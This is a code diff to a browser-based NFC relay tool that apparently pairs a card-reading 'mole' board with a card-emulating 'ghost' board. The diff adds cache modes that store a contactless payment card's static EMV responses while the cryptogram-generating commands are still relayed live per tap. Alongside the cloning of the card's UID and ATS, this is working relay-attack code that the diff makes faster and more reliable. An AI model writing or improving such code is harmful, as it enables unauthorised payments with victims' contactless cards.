@@ -18,7 +18,7 @@
  */
 'use strict';
 
-const BUILD = '2026-09-08c clear-cache-btn';   // shown in the log so you can confirm which version loaded
+const BUILD = '2026-09-08d cache-modes';   // shown in the log so you can confirm which version loaded
 
 // --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
 const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
@@ -440,8 +440,29 @@ function releaseWakeLock() { try { if (wakeLock) { wakeLock.release(); wakeLock 
 document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible' && running && !wakeLock) acquireWakeLock(); });
 let running = false;
 let apduCount = 0;
+let learnCache = false;                 // learn mode active for this run
+let cacheCount = 0;                      // static entries currently in the ghost (host's view)
+const cachedCmds = new Set();           // hex of cmds already cached this session (dedupe)
 
 const $ = id => document.getElementById(id);
+
+function setCacheStatus(note) {
+  const el = $('cache-status'); if (!el) return;
+  el.textContent = cacheCount > 0 ? `cache: ${cacheCount} cached${note ? ' (' + note + ')' : ''}` : 'cache: empty';
+  el.style.color = cacheCount > 0 ? 'var(--green)' : 'var(--muted)';
+}
+function cacheReset() { cacheCount = 0; cachedCmds.clear(); setCacheStatus(); }
+
+// Which relayed commands are safe to cache (static). NOT GPO (80 A8, dynamic PDOL)
+// or GENERATE AC (80 AE, cryptogram) — those must stay live per tap.
+function isCacheable(apdu) {
+  if (apdu.length < 2) return false;
+  const c = apdu[0], i = apdu[1];
+  if (c === 0x00 && i === 0xA4) return true;   // SELECT (PPSE / AID)
+  if (c === 0x00 && i === 0xB2) return true;   // READ RECORD
+  if (c === 0x80 && i === 0xCA) return true;   // GET DATA
+  return false;
+}
 
 function log(msg, cls) {
   const el = $('log');
@@ -565,10 +586,14 @@ async function armGhost(anti, slot, staticPairs) {
   await ghost.setSlotTagType(slot, TAG_HF14A_4);
   await ghost.setSlotEnable(slot, SENSE_HF, true);
   try { await ghost.clearStaticResponses(); } catch (e) {}  // safety: never serve a stale cache
+  cacheReset();
   await ghost.setAntiColl(anti);   // anti-coll BEFORE emulator mode
   if (staticPairs && staticPairs.length) {
     let n = 0;
-    for (const p of staticPairs) { try { await ghost.addStaticResponse(p.cmd, p.resp); n++; } catch (e) {} }
+    for (const p of staticPairs) {
+      try { await ghost.addStaticResponse(p.cmd, p.resp); n++; cachedCmds.add(hxc(p.cmd)); } catch (e) {}
+    }
+    cacheCount = n; setCacheStatus('prefill');
     log(`loaded ${n}/${staticPairs.length} cached responses into the ghost`, 'ok');
   }
   await ghost.changeMode(false);   // tag / emulator mode
@@ -606,7 +631,7 @@ async function startRelay() {
   const mode = document.querySelector('input[name=mode]:checked').value;
   const gate = (mode === 'B');
   const slot = parseInt($('slot').value, 10) || 1;
-  const useCache = !!($('cache') && $('cache').checked);   // hybrid static cache (opt-in)
+  const cacheMode = ($('cache') && $('cache').value) || 'off';   // 'off' | 'prefill' | 'learn'
   // Adaptive poll: tight while a transaction is live (the phone is WTX-stalled
   // waiting on us, so every ms of poll gap is added latency), relaxed when idle
   // to spare BLE/CPU/battery. Safe on a slow link: the transport is strictly
@@ -637,11 +662,14 @@ async function startRelay() {
     log(`cloned card UID=${hex(anti.uid)} ATQA=${hex(anti.atqa)} SAK=${anti.sak.toString(16)} ATS=${hex(anti.ats)}`, 'ok');
 
     let staticPairs = null;
-    if (useCache) {
-      log('cache ON: pre-reading card static flow (one-time, adds a few s to Start)…', 'ok');
+    if (cacheMode === 'prefill') {
+      log('cache PRE-FILL: pre-reading card static flow (one-time, adds a few s to Start)…', 'ok');
       staticPairs = await buildStaticCache(M);   // read PPSE/SELECT/GPO/records/GETDATA off the live card
+    } else if (cacheMode === 'learn') {
+      log('cache LEARN: cache fills from live taps (first tap slow, then fast; partial taps still bank what they got)', 'ok');
     }
     await armGhost(anti, slot, staticPairs);
+    learnCache = (cacheMode === 'learn');
     let armed = true;
     ghost.setLed(1).catch(() => {}); setLedUI('ghost', 'green'); setLedUI('mole', 'green');
     if (gate) log('MODE B: ghost withholds emulation until board2 has the card.', 'ok');
@@ -715,6 +743,13 @@ async function startRelay() {
       catch (_) { rg = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
       const tSend = performance.now();
       if (rg.status === ST.SUCCESS) pending = rg.data;   // next APDU in hand -> no gap next iter
+      // LEARN mode: bank this static response so the NEXT tap serves it from cache.
+      // Per-APDU + only on a real response, so a tap that aborts later still keeps
+      // whatever it did fetch (the cache fills progressively across taps).
+      if (learnCache && resp.length >= 2 && isCacheable(apdu) && !cachedCmds.has(hxc(apdu))) {
+        try { await ghost.addStaticResponse(apdu, resp); cachedCmds.add(hxc(apdu)); cacheCount++; setCacheStatus('learning'); }
+        catch (_) {}
+      }
       apduCount++;
       log(`#${apduCount}  ->card ${hex(apdu)}`);
       log(`     card-> ${hex(resp)}  (st=${rr.status})`, resp.length ? '' : 'warn');
@@ -859,7 +894,7 @@ async function dumpRxLog() {
 
 async function clearCache() {
   if (!ghost.connected) { log('connect the ghost board first', 'warn'); return; }
-  try { await ghost.clearStaticResponses(); log('ghost static cache cleared (pure live relay until next cached Start)', 'ok'); }
+  try { await ghost.clearStaticResponses(); cacheReset(); log('ghost static cache cleared', 'ok'); }
   catch (e) { log('clear cache failed: ' + (e.message || e), 'err'); }
 }
 
